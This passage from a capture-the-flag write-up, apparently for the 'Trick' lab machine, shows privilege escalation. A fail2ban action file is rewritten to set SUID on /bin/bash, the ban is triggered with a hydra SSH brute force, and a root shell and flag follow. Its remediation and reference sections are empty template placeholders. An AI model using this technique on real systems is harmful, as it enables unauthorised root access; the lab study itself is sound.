michael@trick:~$ cp /etc/fail2ban/action.d/iptables-multiport.conf .
```

```
michael@trick:~$ nano iptables-multiport.conf
```

edit this line to the set the `SUID` on /bin/bash:

```shell
actionban = chmod u+s /bin/bash    
#actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
```

replace the og file:

```
michael@trick:~$ mv iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf
mv: replace '/etc/fail2ban/action.d/iptables-multiport.conf', overriding mode 0644 (rw-r--r--)? y

```

```
michael@trick:~$ sudo /etc/init.d/fail2ban restart
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
```

on kali:
```
hydra 10.129.137.188 ssh -l root -P /usr/share/wordlists/rockyou.txt
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-18 09:44:44
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.129.137.188:22/
[STATUS] 226.00 tries/min, 226 tries in 00:01h, 14344175 to do in 1057:50h, 14 active
[STATUS] 192.00 tries/min, 576 tries in 00:03h, 14343828 to do in 1245:08h, 11 active



```

## Root flag

```
michael@trick:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
michael@trick:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
michael@trick:~$ /bin/bash -p
bash-5.0# id
uid=1001(michael) gid=1001(michael) euid=0(root) groups=1001(michael),1002(security)
bash-5.0# cat /root/root.txt
7bcc6d11dcc64672dd4d8e8c103c4591
bash-5.0# 

```

---
## Remediation

- Key takeaway 1
- Key takeaway 2
- Key takeaway 3

---
## References

- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)